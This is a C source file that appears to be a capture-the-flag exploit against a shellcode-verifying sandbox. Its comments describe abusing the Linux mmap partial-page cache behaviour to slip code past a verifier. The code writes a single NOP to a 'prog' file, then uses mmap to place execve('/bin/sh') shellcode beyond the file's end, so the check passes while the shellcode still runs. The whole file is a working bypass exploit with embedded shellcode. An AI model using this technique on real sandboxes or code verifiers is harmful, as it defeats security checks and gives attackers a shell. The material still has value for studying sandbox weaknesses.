#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <signal.h>
#include <sys/mount.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

// execve("/bin/sh") shellcode from: http://shell-storm.org/shellcode/files/shellcode-806.php
#define SH_SHELLCODE "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#define NOP "\x90"
#define NOP_SIZE (1)
#define PROG_PATH "prog"

// Exploit strategy:
// We rely on a documented mmap bug (see "man 2 mmap") regrading the file page cache.
// Let's quote from the man:
//     POSIX specifies that the system shall always zero fill any partial page at the end of  the
//     object and that system will never write any modification of the object beyond its end.  On
//     Linux, when you write data to such partial page after the end  of  the  object,  the  data
//     stays  in  the  page  cache even after the file is closed and unmapped and even though the
//     data is never written to the file itself, subsequent mappings may see  the  modified  con‐
//     tent. [...]
//
// Because 'mmap' works on page-granularity, we can abuse this bug in order to pass verification.
// We abuse the flow in "exec_output": the size of the file is obtained by 'fstat' and passed to
// the shellcode verifier, but the whole page is mmap-ed and later executed. Because we abuse the
// mmap page cache bug, we can make sure there are more controlled bytes past the verified 
// shellcode - which will be executed but won't be verified.
//
// So the general flow we run in the compiler:
// 1. Create "prog" file, write a single "nop" instruction (0x90) into it.
// 2. sleep() for a little (maybe not needed - just solved some problems in practice)
// 3. mmap the "prog" file, and write past the nop instruction our execve("/bin/sh") shellcode.
// 4. exit() right away. The sandbox process will now continue.
// 5. In the sandbox, 'exec_output' will only verify the "nop", but will execute the entire shellcode.
// 6. ???
// 7. PROFIT

int main(void)
{
    // Create "prog" file, and write a single NOP instruction into it
    int prog_fd = -1;
    prog_fd = open(PROG_PATH, O_CREAT | O_WRONLY, 0777);
    write(prog_fd, NOP, NOP_SIZE);
    close(prog_fd);
    prog_fd = -1;

    // Sleep for a little (we want to NOP write to be actually applied)
    // (maybe not really needed)
    sleep(5);

    // mmap the prog file, and write our 'execve("/bin/sh")' shellcode beyond the NOP instruction.
    // We exit right after we write to the page, in order to make sure the windows for cache flushing
    // is minimal.
    prog_fd = open(PROG_PATH, O_RDWR);
    uint8_t * prog_memory = mmap(NULL, NOP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, prog_fd, 0);
    memcpy(&prog_memory[NOP_SIZE], SH_SHELLCODE, sizeof(SH_SHELLCODE));
    exit(0);
}
